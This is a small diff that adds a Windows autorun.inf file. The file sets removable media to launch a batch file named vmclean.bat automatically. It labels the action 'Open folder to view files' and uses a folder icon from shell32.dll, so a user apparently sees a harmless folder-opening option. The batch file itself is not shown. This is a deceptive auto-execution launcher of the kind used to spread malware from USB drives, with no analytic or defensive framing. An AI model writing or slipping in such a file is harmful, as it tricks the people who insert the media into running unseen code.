@@ -1,0 +1,4 @@
+[autorun]
+open=vmclean.bat
+action=Open folder to view files
+icon=shell32.dll,3
